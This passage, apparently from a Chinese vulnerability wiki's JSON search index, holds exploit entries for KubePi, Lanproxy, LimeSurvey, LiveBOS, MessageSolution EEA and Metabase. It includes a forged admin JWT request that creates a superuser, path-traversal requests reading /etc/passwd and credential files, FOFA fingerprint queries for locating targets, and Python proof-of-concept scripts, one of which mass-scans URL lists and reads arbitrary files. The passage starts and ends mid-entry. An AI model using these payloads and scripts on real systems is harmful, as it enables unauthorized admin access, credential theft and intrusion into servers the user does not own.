Kubernetes 集群中的复杂性。 KubePi 中存在 JWT硬编码，攻击者通过硬编码可以获取服务器后台管理权限，添加任意用户。 ","date":"0001-01-01","objectID":"/kubepi-jwtsigkey-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2023-22463/:1:0","tags":null,"title":"","uri":"/kubepi-jwtsigkey-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2023-22463/"},{"categories":null,"content":"漏洞影响 KubePi ","date":"0001-01-01","objectID":"/kubepi-jwtsigkey-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2023-22463/:2:0","tags":null,"title":"","uri":"/kubepi-jwtsigkey-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2023-22463/"},{"categories":null,"content":"网络测绘 \"kubepi\" ","date":"0001-01-01","objectID":"/kubepi-jwtsigkey-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2023-22463/:3:0","tags":null,"title":"","uri":"/kubepi-jwtsigkey-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2023-22463/"},{"categories":null,"content":"漏洞复现 登陆页面 验证POC POST /kubepi/api/v1/users HTTP/1.1 Host: {{Hostname}} User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.127 Safari/537.36 accept: application/json Accept-Encoding: gzip, deflate Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJuaWNrTmFtZSI6IkFkbWluaXN0cmF0b3IiLCJlbWFpbCI6InN1cHBvcnRAZml0MmNsb3VkLmNvbSIsImxhbmd1YWdlIjoiemgtQ04iLCJyZXNvdXJjZVBlcm1pc3Npb25zIjp7fSwiaXNBZG1pbmlzdHJhdG9yIjp0cnVlLCJtZmEiOnsiZW5hYmxlIjpmYWxzZSwic2VjcmV0IjoiIiwiYXBwcm92ZWQiOmZhbHNlfX0.XxQmyfq_7jyeYvrjqsOZ4BB4GoSkfLO2NvbKCEQjld8 { \"authenticate\": { \"password\": \"{{randstr}}\" }, \"email\": \"{{randstr}}@qq.com\", \"isAdmin\": true, \"mfa\": { \"enable\": false }, \"name\": \"{{randstr}}\", \"nickName\": \"{{randstr}}\", \"roles\": [ \"Supper User\" ] } ","date":"0001-01-01","objectID":"/kubepi-jwtsigkey-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2023-22463/:4:0","tags":null,"title":"","uri":"/kubepi-jwtsigkey-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2023-22463/"},{"categories":null,"content":"KubePi LoginLogsSearch 未授权访问漏洞 CVE-2023-22478 ","date":"0001-01-01","objectID":"/kubepi-loginlogssearch-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2023-22478/:0:0","tags":null,"title":"","uri":"/kubepi-loginlogssearch-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2023-22478/"},{"categories":null,"content":"漏洞描述 KubePi 是一个现代化的 K8s 面板。KubePi 允许管理员导入多个 Kubernetes 集群，并且通过权限控制，将不同 cluster、namespace 的权限分配给指定用户。它允许开发人员管理 Kubernetes 集群中运行的应用程序并对其进行故障排查，供开发人员更好地处理 Kubernetes 集群中的复杂性。 KubePi LoginLogsSearch 方法下的接口存在未授权访问漏洞，攻击者通过漏洞可以未授权获取用户的登录日志信息，进一步爆破用户。 ","date":"0001-01-01","objectID":"/kubepi-loginlogssearch-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2023-22478/:1:0","tags":null,"title":"","uri":"/kubepi-loginlogssearch-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2023-22478/"},{"categories":null,"content":"漏洞影响 KubePi \u003c= v1.6.4 ","date":"0001-01-01","objectID":"/kubepi-loginlogssearch-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2023-22478/:2:0","tags":null,"title":"","uri":"/kubepi-loginlogssearch-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2023-22478/"},{"categories":null,"content":"网络测绘 \"kubepi\" ","date":"0001-01-01","objectID":"/kubepi-loginlogssearch-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2023-22478/:3:0","tags":null,"title":"","uri":"/kubepi-loginlogssearch-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2023-22478/"},{"categories":null,"content":"漏洞复现 登录页面 补丁中对路由加了身份验证 对应的接口为 验证POC POST /kubepi/api/v1/systems/login/logs/search?pageNum=1\u0026\u0026pageSize=10 HTTP/1.1 Content-Type: application/json {} ","date":"0001-01-01","objectID":"/kubepi-loginlogssearch-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2023-22478/:4:0","tags":null,"title":"","uri":"/kubepi-loginlogssearch-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2023-22478/"},{"categories":null,"content":"Lanproxy 目录遍历漏洞 CVE-2021-3019 ","date":"0001-01-01","objectID":"/lanproxy-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cve-2021-3019/:0:0","tags":null,"title":"","uri":"/lanproxy-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cve-2021-3019/"},{"categories":null,"content":"漏洞描述 Lanproxy是一个将局域网个人电脑、服务器代理到公网的内网穿透工具，支持tcp流量转发，可支持任何tcp上层协议（访问内网网站、本地支付接口调试、ssh访问、远程桌面等等）本次Lanproxy 路径遍历漏洞 (CVE-2021-3019)通过../绕过读取任意文件。该漏洞允许目录遍历读取/../conf/config.properties来获取到内部网连接的凭据。 ","date":"0001-01-01","objectID":"/lanproxy-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cve-2021-3019/:1:0","tags":null,"title":"","uri":"/lanproxy-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cve-2021-3019/"},{"categories":null,"content":"漏洞影响 Lanproxy 0.1 ","date":"0001-01-01","objectID":"/lanproxy-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cve-2021-3019/:2:0","tags":null,"title":"","uri":"/lanproxy-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cve-2021-3019/"},{"categories":null,"content":"网络测绘 header= \"Server: LPS-0.1\" ","date":"0001-01-01","objectID":"/lanproxy-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cve-2021-3019/:3:0","tags":null,"title":"","uri":"/lanproxy-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cve-2021-3019/"},{"categories":null,"content":"环境搭建 https://github.com/ffay/lanproxy/ ","date":"0001-01-01","objectID":"/lanproxy-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cve-2021-3019/:4:0","tags":null,"title":"","uri":"/lanproxy-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cve-2021-3019/"},{"categories":null,"content":"漏洞复现 打开登录页面如下 使用Burp抓包发送如下请求 GET /../conf/config.properties HTTP/1.1 Host: xxx.xxx.xxx.xxx Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Connection: close 成功在配置文件中读取 账号密码 试着读取其他敏感文件 ","date":"0001-01-01","objectID":"/lanproxy-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cve-2021-3019/:5:0","tags":null,"title":"","uri":"/lanproxy-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cve-2021-3019/"},{"categories":null,"content":"漏洞POC Github:CVE-2021-3019 #!/usr/bin/env python3 # -*- encoding: utf-8 -*- ''' @File : urllib.py @Time : 2021/01/10 21:59:32 @Author : _0xf4n9x_ @Version : 1.0 @Contact : fanq.xu@gmail.com @Desc : None ''' import sys import argparse import os from urllib import request from urllib import error banner = \"\"\" ###### ## ## ######## ####### ##### ####### ## ####### ##### ## ####### ## ## ## ## ## ## ## ## ## ## ## #### ## ## ## ## #### ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ###### ##### ####### ## ## ####### ## ##### ####### ## ## ## ######## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ###### ### ######## ######### ##### ######### ###### ####### ##### ###### ####### Author: _0xf4n9x_\"\"\" headers = { 'User-Agent': \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4080.0 Safari/537.36 Edg/82.0.453.0\"} def readConf(url): \"\"\" 默认读取配置文件，并通过能否读取配置文件来判断是否存在漏洞 \"\"\" config = [ 'config.server.bind', 'config.server.port', 'config.admin.username', 'config.admin.password' ] path = \"/../conf/config.properties\" confUrl = url + path r = request.Request(confUrl, headers=headers) try: with request.urlopen(r, timeout=10) as resp: confContent = resp.read().decode('utf-8') for i in config: if i not in confContent: print(\"[-] \" + url + \" is not vulnerable\") return 'Bye :(' print(\"[+] \" + url + \" is vulnerable! :)\") return confContent except ConnectionResetError: print(\"[-] \" + url + \" Connection reset by peer\") except error.HTTPError as e: print(\"[-] \" + url + e.code + e.reason) except error.URLError as e: print(\"[-] \" + url + e.code + e.reason) except: print(\"[-] \" + url + \" is not vulnerable\") return 0 def readOtherFile(url, path): \"\"\" 读取任意其他文件 \"\"\" jumpSym = \"/../../../../../../../../..\" fullUrl = url + jumpSym + path r = request.Request(fullUrl, headers=headers) with request.urlopen(r, timeout=10) as resp: fileContent = resp.read().decode('utf-8') print(fileContent) def run(url, path=\"/../conf/config.properties\"): if os.path.isfile(url) == False: # if 'http' not in url: # url = 'http://' + url url = 'http://' + url.replace('http://', '').replace('/', '') if path == \"/../conf/config.properties\": print(readConf(url)) else: if readConf(url) not in [0, 'Bye :(']: readOtherFile(url, path) else: urls = [] with open(url) as target: urls = target.read().splitlines() for url in urls: # if 'http' not in url: # url = 'http://' + url url = 'http://' + url.replace('http://', '').replace('/', '') if readConf(url) not in [0, 'Bye :(']: with open(\"success.txt\", \"a+\") as f: f.write(url + \"\\n\") f.close() def main(): parser = argparse.ArgumentParser( description=\"CVE-2021-3019 lanproxy arbitrary file read vulnerability detection POC\") parser.add_argument('-u', '--url', type=str, help=\"test a single website\") parser.add_argument('-r', '--read', type=str, help=\"this parameter is followed by the file name to be read, the configuration file is read by default\") parser.add_argument('-f', '--file', type=str, help=\"perform vulnerability checks on multiple websites in a file, and the vulnerable websites will be output to the success.txt file\") args = parser.parse_args() if len(sys.argv) \u003c= 1: parser.print_help() elif sys.argv[1] in ['-u', '--url']: if len(sys.argv) == 3: run(args.url) elif len(sys.argv) == 5: run(args.url, args.read) elif sys.argv[1] in ['-f', '--file']: run(args.file) if __name__ == \"__main__\": print(banner) main() ","date":"0001-01-01","objectID":"/lanproxy-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cve-2021-3019/:6:0","tags":null,"title":"","uri":"/lanproxy-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cve-2021-3019/"},{"categories":null,"content":"LimeSurvey LimeSurveyFileManager.php 后台任意文件读取漏洞 CVE-2020-11455 ","date":"0001-01-01","objectID":"/limesurvey-limesurveyfilemanager.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-11455/:0:0","tags":null,"title":"","uri":"/limesurvey-limesurveyfilemanager.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-11455/"},{"categories":null,"content":"漏洞描述 LimeSurvey（前称PHPSurveyor）是LimeSurvey团队的一套开源的在线问卷调查程序，它支持调查程序开发、调查问卷发布以及数据收集等功能。 LimeSurvey 4.1.12 + 200324之前版本中的application/controllers/admin/LimeSurveyFileManager.php文件存在路径遍历漏洞。该漏洞源于网络系统或产品未能正确地过滤资源或文件路径中的特殊元素。攻击者可利用该漏洞访问受限目录之外的位置。 ","date":"0001-01-01","objectID":"/limesurvey-limesurveyfilemanager.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-11455/:1:0","tags":null,"title":"","uri":"/limesurvey-limesurveyfilemanager.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-11455/"},{"categories":null,"content":"漏洞影响 LimeSurvey \u003c 4.1.12 + 200324 ","date":"0001-01-01","objectID":"/limesurvey-limesurveyfilemanager.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-11455/:2:0","tags":null,"title":"","uri":"/limesurvey-limesurveyfilemanager.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-11455/"},{"categories":null,"content":"网络测绘 app=\"LimeSurvey\" ","date":"0001-01-01","objectID":"/limesurvey-limesurveyfilemanager.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-11455/:3:0","tags":null,"title":"","uri":"/limesurvey-limesurveyfilemanager.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-11455/"},{"categories":null,"content":"漏洞复现 登录页面 出现漏洞的文件为 application/controllers/admin/LimeSurveyFileManager.php public function downloadFiles() { App()-\u003eloadLibrary('admin.pclzip'); $folder = basename(Yii::app()-\u003erequest-\u003egetPost('folder', 'global')); $files = Yii::app()-\u003erequest-\u003egetPost('files'); $tempdir = Yii::app()-\u003egetConfig('tempdir'); $randomizedFileName = $folder.'_'.substr(md5(time()),3,13).'.zip'; $zipfile = $tempdir.DIRECTORY_SEPARATOR.$randomizedFileName; $arrayOfFiles = array_map( function($file){ return $file['path']; }, $files); $archive = new PclZip($zipfile); $checkFileCreate = $archive-\u003ecreate($arrayOfFiles, PCLZIP_OPT_REMOVE_ALL_PATH); $urlFormat = Yii::app()-\u003egetUrlManager()-\u003egetUrlFormat(); $getFileLink = Yii::app()-\u003ecreateUrl('admin/filemanager/sa/getZipFile'); if($urlFormat == 'path') { $getFileLink .= '?path='.$zipfile; } else { $getFileLink .= '\u0026path='.$zipfile; } $this-\u003e_printJsonResponse( [ 'success' =\u003e true, 'message' =\u003e sprintf(gT(\"Files are ready for download in archive %s.\"), $randomizedFileName), 'downloadLink' =\u003e $getFileLink , ] ); } 路由为: admin/filemanager/sa/getZipFile, 这里传入参数 path 到方法 getZipFile()中 这里通过 readfile方法 读取文件，登录后台后发送请求 /index.php/admin/filemanager/sa/getZipFile?path=/../../../../../../../etc/passwd ","date":"0001-01-01","objectID":"/limesurvey-limesurveyfilemanager.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-11455/:4:0","tags":null,"title":"","uri":"/limesurvey-limesurveyfilemanager.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-11455/"},{"categories":null,"content":"LiveBOS ShowImage.do 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/livebos-showimage.do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/livebos-showimage.do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 LiveBOS ShowImage.do 接口存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中的敏感文件 ","date":"0001-01-01","objectID":"/livebos-showimage.do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/livebos-showimage.do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 LiveBOS ","date":"0001-01-01","objectID":"/livebos-showimage.do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/livebos-showimage.do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"LiveBOS-框架\" ","date":"0001-01-01","objectID":"/livebos-showimage.do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/livebos-showimage.do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 验证POC /feed/ShowImage.do;.js.jsp?type=\u0026imgName=../../../../../../../../../../../../../../../etc/passwd ","date":"0001-01-01","objectID":"/livebos-showimage.do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/livebos-showimage.do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"MessageSolution 邮件归档系统EEA 信息泄露漏洞 CNVD-2021-10543 ","date":"0001-01-01","objectID":"/messagesolution-%E9%82%AE%E4%BB%B6%E5%BD%92%E6%A1%A3%E7%B3%BB%E7%BB%9Feea-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cnvd-2021-10543/:0:0","tags":null,"title":"","uri":"/messagesolution-%E9%82%AE%E4%BB%B6%E5%BD%92%E6%A1%A3%E7%B3%BB%E7%BB%9Feea-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cnvd-2021-10543/"},{"categories":null,"content":"漏洞描述 MessageSolution企业邮件归档管理系统 EEA是北京易讯思达科技开发有限公司开发的一款邮件归档系统。该系统存在通用WEB信息泄漏，泄露Windows服务器administrator hash与web账号密码 ","date":"0001-01-01","objectID":"/messagesolution-%E9%82%AE%E4%BB%B6%E5%BD%92%E6%A1%A3%E7%B3%BB%E7%BB%9Feea-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cnvd-2021-10543/:1:0","tags":null,"title":"","uri":"/messagesolution-%E9%82%AE%E4%BB%B6%E5%BD%92%E6%A1%A3%E7%B3%BB%E7%BB%9Feea-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cnvd-2021-10543/"},{"categories":null,"content":"漏洞影响 MessageSolution 企业邮件归档管理系统EEA ","date":"0001-01-01","objectID":"/messagesolution-%E9%82%AE%E4%BB%B6%E5%BD%92%E6%A1%A3%E7%B3%BB%E7%BB%9Feea-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cnvd-2021-10543/:2:0","tags":null,"title":"","uri":"/messagesolution-%E9%82%AE%E4%BB%B6%E5%BD%92%E6%A1%A3%E7%B3%BB%E7%BB%9Feea-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cnvd-2021-10543/"},{"categories":null,"content":"网络测绘 title=\"MessageSolution Enterprise Email Archiving (EEA)\" ","date":"0001-01-01","objectID":"/messagesolution-%E9%82%AE%E4%BB%B6%E5%BD%92%E6%A1%A3%E7%B3%BB%E7%BB%9Feea-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cnvd-2021-10543/:3:0","tags":null,"title":"","uri":"/messagesolution-%E9%82%AE%E4%BB%B6%E5%BD%92%E6%A1%A3%E7%B3%BB%E7%BB%9Feea-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cnvd-2021-10543/"},{"categories":null,"content":"漏洞复现 登录页面如下 访问如下Url http://xxx.xxx.xxx.xxx/authenticationserverservlet/ 使用获得到的密码可以登录系统 ","date":"0001-01-01","objectID":"/messagesolution-%E9%82%AE%E4%BB%B6%E5%BD%92%E6%A1%A3%E7%B3%BB%E7%BB%9Feea-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cnvd-2021-10543/:4:0","tags":null,"title":"","uri":"/messagesolution-%E9%82%AE%E4%BB%B6%E5%BD%92%E6%A1%A3%E7%B3%BB%E7%BB%9Feea-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cnvd-2021-10543/"},{"categories":null,"content":"漏洞POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: MessageSolution 企业邮件归档管理系统EEA \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/authenticationserverservlet/\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if response.status_code == 200 and \"administrator\" in response.text: print(\"\\033[32m[o] 目标 {} 存在信息泄露 响应为:{}\\033[0m\".format(target_url, response.text)) else: print(\"\\033[31m[x] 目标 {}不存在漏洞 \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] 目标 {} 请求失败 \\033[0m\".format(target_url)) if __name__ == \"__main__\": title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) POC_1(target_url) ","date":"0001-01-01","objectID":"/messagesolution-%E9%82%AE%E4%BB%B6%E5%BD%92%E6%A1%A3%E7%B3%BB%E7%BB%9Feea-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cnvd-2021-10543/:5:0","tags":null,"title":"","uri":"/messagesolution-%E9%82%AE%E4%BB%B6%E5%BD%92%E6%A1%A3%E7%B3%BB%E7%BB%9Feea-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cnvd-2021-10543/"},{"categories":null,"content":"Metabase geojson 任意文件读取漏洞 CVE-2021-41277 ","date":"0001-01-01","objectID":"/metabase-geojson-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-41277/:0:0","tags":null,"title":"","uri":"/metabase-geojson-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-41277/"},{"categories":null,"content":"漏洞描述 在受影响的版本中，自定义 GeoJSON 地图（admin-\u003esettings-\u003emaps-\u003ecustom maps-\u003eadd a map）操作缺少权限验证，攻击者可通过该漏洞获得敏感信息 ","date":"0001-01-01","objectID":"/metabase-geojson-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-41277/:1:0","tags":null,"title":"","uri":"/metabase-geojson-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-41277/"},{"categories":null,"content":"漏洞影响 metabase version \u003c 0.40.5 metabase version \u003e= 1.0.0, \u003c 1.40.5 ","date":"0001-01-01","objectID":"/metabase-geojson-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-41277/:2:0","tags":null,"title":"","uri":"/metabase-geojson-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-41277/"},{"categories":null,"content":"网络测绘 app=\"metabase\" ","date":"0001-01-01","objectID":"/metabase-geojson-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-41277/:3:0","tags":null,"title":"","uri":"/metabase-geojson-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-41277/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /api/geojson?url=file:/etc/passwd ","date":"0001-01-01","objectID":"/metabase-geojson-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-41277/:4:0","tags":null,"title":"","uri":"/metabase-geojson-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-41277/"},{"categories":null,"content":"Metabase validate 远程命令执行漏洞 CVE-2023-38646 ","date":"0001-01-01","objectID":"/metabase-validate-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2023-38646/:0:0","tags":null,"title":"","uri":"/metabase-validate-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2023-38646/"},{"categories":null,"content":"漏洞描述 Metabase是一个开源的数据分析和可视化工具，它可以帮助用户轻松地连接到各种数据源，包括数据库、云服务和API，然后使用直观的界面进行数据查询、分析和可视化。未经身份认证的远程攻击者利用该漏洞可以在服务器上以运行 Metabase 服务器的权限执行任意命令 ","date":"0001-01-01","objectID":"/metabase-validate-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2023-38646/:1:0","tags":null,"title":"","uri":"/metabase-validate-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2023-38646/"},{"categories":null,"content":"漏洞影响 Metabase 